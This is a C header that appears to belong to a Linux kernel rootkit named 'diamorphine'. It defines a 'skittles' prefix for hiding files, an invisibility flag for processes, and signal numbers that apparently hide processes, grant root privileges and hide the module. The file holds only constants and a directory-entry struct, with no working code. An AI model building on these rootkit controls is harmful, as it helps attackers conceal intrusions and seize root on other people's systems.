struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};

#define MAGIC_PREFIX "skittles"

#define PF_INVISIBLE 0x10000000

#define MODULE_NAME "diamorphine"

enum {
	SIGINVIS = 666,
	SIGSUPER = 777,
	SIGMODINVIS = 999,
};

#ifndef IS_ENABLED
#define IS_ENABLED(option) \
(defined(__enabled_ ## option) || defined(__enabled_ ## option ## _MODULE))
#endif
